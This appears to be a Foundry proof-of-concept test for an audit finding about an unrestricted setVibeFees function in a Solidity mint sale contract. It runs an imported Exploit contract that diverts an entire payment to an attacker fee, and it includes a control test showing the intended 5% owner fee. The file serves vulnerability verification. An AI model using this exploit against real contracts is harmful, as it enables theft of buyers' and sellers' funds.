// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Exploit, FixedMintSaleBase} from "./27818-unrestricted-access-to-the-setvibefees-function-in-mintsaleb.sol";

contract Finding27818Test is Test {
    function test_open_fee_setter_takes_the_whole_payment() public {
        Exploit e = new Exploit();
        vm.deal(address(this), 1 ether);
        e.run{value: 1 ether}();
        assertEq(e.feeTaken(), 1 ether, "attacker treasury");
        assertEq(e.sellerGot(), 0, "seller");
        console2.log("attacker fee wei", e.feeTaken());
        console2.log("seller proceeds wei", e.sellerGot());
    }

    function test_control_owner_fee_is_five_percent() public {
        FixedMintSaleBase sale = new FixedMintSaleBase();
        address attacker = address(0xA11CE);
        vm.prank(attacker);
        vm.expectRevert(bytes("not owner"));
        sale.setVibeFees(attacker, 10000);

        address treasury = address(0x7Eea);
        vm.deal(treasury, 0);
        sale.setVibeFees(treasury, 500);
        vm.deal(address(this), 1 ether);
        sale.buy{value: 1 ether}();

        assertEq(treasury.balance, 0.05 ether, "protocol fee");
        assertEq(sale.sellerProceeds(), 0.95 ether, "seller");
        assertEq(attacker.balance, 0, "attacker");
        console2.log("control treasury wei", treasury.balance);
        console2.log("control seller wei", sale.sellerProceeds());
    }
}
